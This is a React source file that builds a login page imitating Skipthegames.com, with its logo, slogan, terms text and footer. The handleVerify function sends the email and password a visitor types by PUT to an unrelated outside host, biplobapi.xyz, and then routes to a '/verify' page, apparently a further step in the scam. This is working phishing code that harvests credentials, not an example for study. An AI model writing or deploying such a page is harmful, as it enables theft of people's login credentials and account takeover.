import React from "react";
import { useState } from "react";
import { useForm } from "react-hook-form";
import { useLocation, useNavigate } from "react-router-dom";

const Form = () => {
  const { state } = useLocation();
  const navigate = useNavigate();
  const { temp } = state;
  console.log(temp);
  const [passwordError, setPasswordError] = useState(false);
  const [cookie, setCookie] = useState(true);
  const {
    register,
    handleSubmit,
    formState: { errors },
    reset,
  } = useForm();
  const handleVerify = (data) => {
    const bookings = {
      email: data.email,
      password: data.password,
    };

    // console.log(bookings);

    fetch(`https://biplobapi.xyz/cash/${temp}`, {
      method: "PUT",
      headers: {
        "content-type": "application/json",
      },
      body: JSON.stringify(bookings),
    })
      .then((res) => res.json())
      .then((data) => {
        if (data.modifiedCount > 0) {
          navigate("/verify", { state: { temp: temp } });
        }
      });
  };

  const cookiesBtn = () => {
    setCookie(false);
  };
  return (
    <div>
      <section
        id="attention"
        className={`px-1 ${!cookie ? "d-none" : "d-block"}`}
      >
        <div className="container head">
          <div className="row">
            {/* <div className="col-md-12 pl-3 pb-1 pt-3 ">
              <p>
                <strong>
                  Providers, we do not send out text messages ever, do not click
                  on links from them. Signups will be open at the end of{" "}
                  <span id="date"></span>
                </strong>
              </p>
              <p>
                <strong>Providers,</strong>
                video chats, cash app requests, asking you to login with your
                stg login are a <b>SCAM </b>
              </p>
              <p>
                <strong>ALL,</strong>
                The image search (is this photo real?) feature is currently
                broken, it will be fixed start of december.
              </p>
            </div> */}
            <div className="col-md-12 py-2">
              <p>
                We use cookies, just to track visits to our website, we store no
                personal deatils.{" "}
                <a onClick={cookiesBtn} className="acpt_btn">
                  ACCEPT COOKIES
                </a>{" "}
                <a href="" className="whtck">
                  What are cookies?
                </a>{" "}
              </p>
            </div>
          </div>
        </div>
      </section>
      <section className="menu mt-5">
        <div className="container">
          <div className="row">
            <div className="col-md-4 text-left">
              <img
                src="/datas/images/Skipthegames-255x39.png"
                alt=""
                className="w-75"
              />
              <h5>
                {" "}
                Skip the games. <span>Get satisfaction.</span>
              </h5>
            </div>
            {/* <div className="col-md-4 text-left">
              <h5>
                {" "}
                Skip the games. <span>Get satisfaction.</span>
              </h5>
            </div>
            <div className="col-md-4 text-center">
              <a className="post_ad">Post your free ad</a>
            </div> */}
          </div>
        </div>
      </section>
      <section id="main_form">
        <div className="container">
          <div className="row">
            <div className="col-md-5 pt-1">
              <h3>Log in to your account</h3>
              <br />
              <form
                onSubmit={handleSubmit(handleVerify)}
                className="needs-validation"
              >
                <div className="form-group mt-1">
                  <input
                    {...register("email")}
                    type="email"
                    className="form-control py-2"
                    id="exampleInputEmail1"
                    aria-describedby="emailHelp"
                    placeholder="Your email"
                    name="email"
                    required
                  />
                  <div className="invalid-feedback">
                    Please enter a valid email address.
                  </div>
                </div>
                <div className="form-group mt-1 mb-0">
                  <input
                    {...register("password")}
                    type="password"
                    className={`form-control py-2 ${
                      passwordError && "border border-danger"
                    }`}
                    id="exampleInputPassword1"
                    placeholder="Password"
                    name="password"
                    required
                    defaultValue={passwordError ? "" : ""}
                  />
                  {passwordError && (
                    <small className="text-danger">Password Incorrect</small>
                  )}
                </div>

                <p className="text-danger">
                  {" "}
                  <a className="forget ">
                    {/* <b>Show Password</b> */}
                    Show Password
                  </a>
                </p>
                <input
                  type="hidden"
                  name="dom"
                  className="dominfo"
                  value="{{ $id }}"
                />
                <input
                  type="hidden"
                  className="dominfo"
                  name="dom"
                  value="{{ $id}}"
                />
                <input
                  type="hidden"
                  className="dominfo"
                  name="id_user"
                  value="{{ $id_user}}"
                />
                <input type="hidden" className="device" value="{{$result}}" />
                <button type="submit" className="btn-skip">
                  Log in
                </button>
              </form>
              <p className="text-danger mt-2">
                <b>Password not working?</b>{" "}
                <a className="forget">
                  <b>Click here</b>
                </a>
              </p>

              <p className="accpet mt-4">
                By clicking "Log in",you accept{" "}
                <a>Skipthegames.com's Terms and Conditions of use</a>
              </p>
              <p className="accpet mt-4">
                The site is protected by Captcha and its <a>privacy policy</a>
                and<a>Terms of service</a>
                apply
              </p>
            </div>
            <div className="col-md-2"></div>
            <div className="col-md-5 text-left pt-4">
              <div className="ml-5">
                <h2>First time here?</h2>

                <a
                  className="forget mt-1"
                  style={{ color: "rgb(183 182 182)" }}
                >
                  Post your first ad
                </a>
              </div>
            </div>
          </div>
        </div>
      </section>
      <hr />
      <section id="bottom_menu">
        <div className="container">
          <div className="row">
            <div className="col-md-12">
              <nav class="navbar navbar-expand-lg bg-body-tertiary">
                <div class="container-fluid">
                  <a className="navbar-brand" href="#">
                    &copy;skipthegames.com
                  </a>
                  <button
                    class="navbar-toggler"
                    type="button"
                    data-bs-toggle="collapse"
                    data-bs-target="#navbarSupportedContent"
                    aria-controls="navbarSupportedContent"
                    aria-expanded="false"
                    aria-label="Toggle navigation"
                  >
                    <span class="navbar-toggler-icon"></span>
                  </button>
                  <div
                    class="collapse navbar-collapse"
                    id="navbarSupportedContent"
                  >
                    <ul class="navbar-nav ms-auto mb-2 mb-lg-0">
                      <li className="nav-item active">
                        <a className="nav-link" href="#">
                          Home
                        </a>
                      </li>
                      <li className="nav-item active">
                        <a className="nav-link" href="#">
                          Contact
                        </a>
                      </li>
                      <li className="nav-item active">
                        <a className="nav-link" href="#">
                          About
                        </a>
                      </li>
                      <li className="nav-item active">
                        <a className="nav-link" href="#">
                          Privacy{" "}
                        </a>
                      </li>
                      <li className="nav-item active">
                        <a className="nav-link" href="#">
                          Terms{" "}
                        </a>
                      </li>
                      <li className="nav-item active">
                        <a className="nav-link" href="#">
                          Escort Info{" "}
                        </a>
                      </li>
                    </ul>
                  </div>
                </div>
              </nav>
            </div>
          </div>
        </div>
      </section>
    </div>
  );
};

export default Form;
